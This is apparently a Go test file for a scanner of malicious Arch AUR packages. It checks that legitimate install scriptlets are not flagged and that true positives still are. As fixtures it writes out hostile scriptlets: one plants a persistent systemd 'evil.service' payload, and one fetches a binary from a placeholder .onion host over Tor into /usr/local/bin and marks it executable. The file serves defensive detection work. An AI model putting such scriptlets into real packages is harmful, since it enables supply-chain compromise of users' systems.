package rules

import (
	"strings"
	"testing"
)

// Shapes taken verbatim from ~120 real AUR packages that ship install
// scriptlets. This population was almost absent from the earlier 158-package
// corpus, so the scriptlet rules had effectively never been exercised against
// legitimate scriptlets — and 32 of the 120 came back MALICIOUS.
func TestLegitimateScriptletsAreNotMalicious(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
	}{
		// netctl-tray: a scriptlet already runs as root, so sudo there is
		// redundant, not an escalation. PRIV-001 asks whether the BUILD tries
		// to gain privileges; inside .install there is nothing to gain.
		{"sudo-in-scriptlet", map[string]string{
			"PKGBUILD": "pkgname=netctl-tray\ninstall=.install",
			".install": "post_install(){ sudo chmod 644 /etc/netctl/*; }",
		}},

		// nps: shipping a unit file is how a package ships a unit file.
		{"ship-unit-into-pkgdir", map[string]string{
			"PKGBUILD": "pkgname=nps\n" +
				"package(){ install -Dm644 ${srcdir}/nps.service ${pkgdir}/usr/lib/systemd/system/nps.service; }",
		}},

		// homeassistant-supervised: enabling the unit the package just shipped,
		// and referring to a real systemd component by name.
		{"enable-shipped-unit", map[string]string{
			"PKGBUILD": "pkgname=homeassistant-supervised\ninstall=.INSTALL",
			".INSTALL": "post_install() {\n" +
				"  systemctl daemon-reload\n" +
				"  systemctl enable \"${SERVICE_NM}\" > /dev/null 2>&1\n" +
				"  if [ \"$(systemctl is-active systemd-journal-gatewayd.socket)\" = 'active' ]; then\n" +
				"    systemctl stop systemd-journal-gatewayd.socket\n" +
				"  fi\n}",
		}},

		// clash-verge-rev-autobuild-bin / easyroam-desktop-bin: a scriptlet
		// fixing the mode of a binary THE PACKAGE ITSELF installed. Nothing is
		// fetched. In the worm the same chmod follows a Tor download of that
		// path, and the download is what PERSIST-007 catches.
		{"chmod-own-binary", map[string]string{
			"PKGBUILD": "pkgname=easyroam-desktop-bin\ninstall=.install",
			".install": "post_install(){ chmod +x /usr/bin/easyroam_connect_desktop; }",
		}},

		{"chmod-own-service-helper", map[string]string{
			"PKGBUILD": "pkgname=clash-verge-rev-autobuild-bin\ninstall=.install",
			".install": "post_install(){ chmod +x /usr/bin/clash-verge-service-install; }",
		}},

		// aide-mhash: an intrusion-detection config naming /etc/shadow is a
		// data file, not a script.
		{"ids-config-names-shadow", map[string]string{
			"PKGBUILD":  "pkgname=aide-mhash\ninstall=.INSTALL",
			"aide.conf": "/etc/shadow p+i+n+u+g+s+m+c+md5\n/etc/passwd p+i+n+u+g",
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			hits := Scan(c.files)
			if f := Floor(hits, false); f == "MALICIOUS" {
				t.Errorf("floor = MALICIOUS on a legitimate package: %v", hits)
			}
			for _, h := range hits {
				if IsFatal(h.Code) {
					t.Errorf("fatal code %s fired: %q", h.Code, h.Snippet)
				}
			}
		})
	}
}

// The narrowing must not blind the scanner. A scriptlet that WRITES a unit file
// onto the live system, rather than enabling one the package shipped, is still
// fatal — and PRIV-001 still applies where it means something.
func TestScriptletNarrowingKeepsTruePositives(t *testing.T) {
	scriptlet := strings.Join([]string{
		"post_install(){",
		"  cat <<UNIT >/etc/systemd/system/evil.service",
		"[Service]",
		"ExecStart=/usr/local/bin/payload",
		"UNIT",
		"  systemctl enable --now evil.service",
		"}",
	}, "\n")
	writes := map[string]string{
		"PKGBUILD":  "pkgname=x\ninstall=x.install",
		"x.install": scriptlet,
	}
	if f := Floor(Scan(writes), false); f != "MALICIOUS" {
		t.Errorf("a scriptlet writing a unit onto the live system must stay fatal, got %q: %v",
			f, Scan(writes))
	}

	// The worm's shape — a FETCH into a system binary directory — is still
	// fatal, with or without the chmod that follows it.
	onion := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaad.onion"
	fetched := map[string]string{
		"PKGBUILD": "pkgname=x\ninstall=x.install",
		"x.install": "post_install(){\n" +
			"  curl -x socks5h://127.0.0.1:9050 http://" + onion + "/m -o /usr/local/bin/m\n" +
			"  chmod +x /usr/local/bin/m\n}",
	}
	if f := Floor(Scan(fetched), false); f != "MALICIOUS" {
		t.Errorf("a fetch into a system bin dir must stay fatal, got %q: %v", f, Scan(fetched))
	}

	// PRIV-001 in the build, where privilege escalation is a real question.
	got := false
	for _, h := range Scan(map[string]string{
		"PKGBUILD": "pkgname=x\npackage(){ sudo make install; }",
	}) {
		if h.Code == "PRIV-001" {
			got = true
		}
	}
	if !got {
		t.Error("PRIV-001 must still fire in a PKGBUILD")
	}
}
